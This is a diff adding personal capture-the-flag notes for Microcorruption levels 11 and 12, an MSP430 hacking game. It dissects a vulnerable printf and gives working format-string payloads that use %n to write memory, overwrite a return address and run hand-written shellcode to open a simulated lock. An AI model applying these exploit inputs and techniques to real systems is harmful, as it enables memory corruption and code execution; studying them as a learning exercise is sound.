@@ -424,4 +424,193 @@ AAAALDCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
 for the password and the door opened (L = 0x4c, D =0x44)
 
 ### Level 11 / Addis Ababa
- 
+Looks like they're using printf now instead of puts...not sure why.
+This time they instruct us to log in with username:password instead of two
+separate prompts.
+username/pass stored at 0x2400 with max length of 0x13
+gets copied to sp+2 (incd)
+test_password_valid is then called with 0x2400 as the parameter (not with the
+strcpied val)
+Since our input is so limited, i don't think we are going to be able to do a
+buffer overflow.  Maybe this will be a format string vulnerability.
+printf is being invoked w/: printf(inputstr)
+
+```
+45c8 <printf>
+45c8:  0b12           push  r11
+45ca:  0a12           push  r10
+45cc:  0912           push  r9
+45ce:  0812           push  r8
+45d0:  0712           push  r7
+45d2:  0412           push  r4
+45d4:  0441           mov sp, r4  
+45d6:  3450 0c00      add #0xc, r4 //r4 is now &userinput
+45da:  2183           decd  sp 
+45dc:  1b44 0200      mov 0x2(r4), r11 // r11 = userInput
+45e0:  8441 f2ff      mov sp, -0xe(r4) //adjust sp to point to sp
+45e4:  0f4b           mov r11, r15 //r11=r15=userinput
+45e6:  0e43           clr r14
+45e8:  0b3c           jmp #0x4600 <printf+0x38>
+45ea:  1f53           inc r15
+45ec:  7d90 2500      cmp.b #0x25, r13  //comparison for the % character
+45f0:  0720           jne #0x4600 <printf+0x38>
+45f2:  6d9f           cmp.b @r15, r13 //compare first char to second char
+45f4:  0320           jne #0x45fc <printf+0x34>
+45f6:  1f53           inc r15 //code path for 1st char!=2nd char  (r15 now
+points to third char)
+45f8:  0d43           clr r13
+45fa:  013c           jmp #0x45fe <printf+0x36>
+45fc:  1d43           mov #0x1, r13 //this line gets skipped depending on if
+you have a repeating character
+45fe:  0e5d           add r13, r14
+4600:  6d4f           mov.b @r15, r13 //r13 = first byte of userinput
+4602:  4d93           tst.b r13 //testing for null byte/end of string
+4604:  f223           jnz #0x45ea <printf+0x22>
+4606:  0f4e           mov r14, r15
+4608:  0f5f           add r15, r15
+460a:  2f53           incd  r15
+460c:  018f           sub r15, sp
+460e:  0941           mov sp, r9
+4610:  0c44           mov r4, r12
+4612:  2c52           add #0x4, r12
+4614:  0f41           mov sp, r15
+4616:  0d43           clr r13
+4618:  053c           jmp #0x4624 <printf+0x5c>
+461a:  af4c 0000      mov @r12, 0x0(r15) //this line looks promising, how do we
+get here?
+461e:  1d53           inc r13
+4620:  2f53           incd  r15
+4622:  2c53           incd  r12
+4624:  0d9e           cmp r14, r13 //what is this comparison
+4626:  f93b           jl  #0x461a <printf+0x52> //we want to take this jump!
+4628:  0a43           clr r10
+462a:  3740 0900      mov #0x9, r7
+462e:  4a3c           jmp #0x46c4 <printf+0xfc>
+4630:  084b           mov r11, r8
+4632:  1853           inc r8
+4634:  7f90 2500      cmp.b #0x25, r15
+4638:  0624           jeq #0x4646 <printf+0x7e>
+463a:  1a53           inc r10
+463c:  0b48           mov r8, r11
+463e:  8f11           sxt r15
+4640:  b012 5045      call  #0x4550 <putchar>
+4644:  3f3c           jmp #0x46c4 <printf+0xfc>
+4646:  6e48           mov.b @r8, r14
+4648:  4e9f           cmp.b r15, r14
+464a:  0620           jne #0x4658 <printf+0x90>
+464c:  1a53           inc r10
+464e:  3f40 2500      mov #0x25, r15
+4652:  b012 5045      call  #0x4550 <putchar>
+4656:  333c           jmp #0x46be <printf+0xf6>
+4658:  7e90 7300      cmp.b #0x73, r14
+465c:  0b20           jne #0x4674 <printf+0xac>
+465e:  2b49           mov @r9, r11
+4660:  053c           jmp #0x466c <printf+0xa4>
+4662:  1a53           inc r10
+4664:  1b53           inc r11
+4666:  8f11           sxt r15
+4668:  b012 5045      call  #0x4550 <putchar>
+466c:  6f4b           mov.b @r11, r15
+466e:  4f93           tst.b r15
+4670:  f823           jnz #0x4662 <printf+0x9a>
+4672:  253c           jmp #0x46be <printf+0xf6>
+4674:  7e90 7800      cmp.b #0x78, r14
+4678:  1c20           jne #0x46b2 <printf+0xea>
+467a:  2b49           mov @r9, r11
+467c:  173c           jmp #0x46ac <printf+0xe4>
+467e:  0f4b           mov r11, r15
+4680:  8f10           swpb  r15
+4682:  3ff0 ff00      and #0xff, r15
+4686:  12c3           clrc
+4688:  0f10           rrc r15
+468a:  0f11           rra r15
+468c:  0f11           rra r15
+468e:  0f11           rra r15
+4690:  1a53           inc r10
+4692:  079f           cmp r15, r7
+4694:  0338           jl  #0x469c <printf+0xd4>
+4696:  3f50 3000      add #0x30, r15
+469a:  023c           jmp #0x46a0 <printf+0xd8>
+469c:  3f50 5700      add #0x57, r15
+46a0:  b012 5045      call  #0x4550 <putchar>
+46a4:  0b5b           add r11, r11
+46a6:  0b5b           add r11, r11
+46a8:  0b5b           add r11, r11
+46aa:  0b5b           add r11, r11
+46ac:  0b93           tst r11
+46ae:  e723           jnz #0x467e <printf+0xb6>
+46b0:  063c           jmp #0x46be <printf+0xf6>
+46b2:  7e90 6e00      cmp.b #0x6e, r14 //0x6e = n 
+46b6:  0320           jne #0x46be <printf+0xf6>
+46b8:  2f49           mov @r9, r15
+46ba:  8f4a 0000      mov r10, 0x0(r15)
+46be:  2953           incd  r9
+46c0:  0b48           mov r8, r11
+46c2:  1b53           inc r11
+46c4:  6f4b           mov.b @r11, r15
+46c6:  4f93           tst.b r15
+46c8:  b323           jnz #0x4630 <printf+0x68>
+46ca:  1144 f2ff      mov -0xe(r4), sp
+46ce:  2153           incd  sp
+46d0:  3441           pop r4
+46d2:  3741           pop r7
+46d4:  3841           pop r8
+46d6:  3941           pop r9
+46d8:  3a41           pop r10
+46da:  3b41           pop r11
+46dc:  3041           ret
+```
+So excusing the code dump, what do we see?  I see comparisons for the '%' and
+'n' characters.
+I entered '%n%n' as my input and got load address unaligned: 6e25 at pc=46be.
+Interesting.  I entered AA%nBB%n and broke at 0x46ba to watch what address I
+was able to write to.  On the second break, I was able to write to 0x4141!  Now
+all I need to do is figure out what the memory location to check if the
+password is correct and we're good to go!  
+After test_password_valid, r15 is moved to 0x40a6.  
+I entered my input as hex encoded - "a640256e4242256e" and the door was
+unlocked!
+### Level 12 / Novosibrisk
+Ok, this time we just have a username prompt
+username - 0x2400, max length -0x1f4
+username is strcpy'd to 0x420c, we control 0x420c - 0x4400
+Again, I don't see anything immediately for a buffer overflow, so let's look at
+format string vulnerabilities again.
+I entered AA%nBB%n as my input and got a load address unaligned at 0x46bc.  The
+difference this time, is that the printf is before the call to
+conditional_unlock_door.  printf("%n", &addr); writes the number of characters
+printed to addr, so we can write any value 1-0x1f4 to any location of our
+choosing; how do we take advantage of that to exploit the program?  
+There is a ret instruction at 0x10.  Perhaps we can overwrite the retAddr with
+0x10 and hopefully control the stack enough to point to something useful?
+I broke at 0x46b8 so i could watch what value and where i was writing to.
+To overwrite ret addr, overwrite 0x4208.  
+08424141414141414141414141410842256e  - that put 0x10 in to 0x4208 
+084237408001378001010712b0123645
+Using that input, I ended up w/ my PC at 0x420e...which is my input!  Can just
+change my A's to...well I actually don't see an unlock_door() function...looks
+like even with the password I'd be screwed.  Guess I'll just write my own
+door_unlock!
+It looks like a door unlock is just calling software interrupt 0x7f.
+To do this, I'll take advantage of the shellcode I wrote in level 7
+```
+mov #0x0180, r7
+sub #0x0101, r7 
+push r7
+call #0x4536 
+```
+Whoops, looks like that shellcode is too long for my buffer! Looks like I need to write more
+efficient shellcode.  
+I saw that r12 had 0x420e in it, so let's use that register and change our
+shellcode to:
+```
+sub #0x418F, r12
+push r12
+call #0x4536 
+```
+Since we're saving an instruction here, our shellcode comes out to
+3c808f410c12b0123645 and fits in the buffer!
+
+I entered 08423c808f410c12b012364541410842256e and it unlocked! 
+### Level 13 / Algiers
+
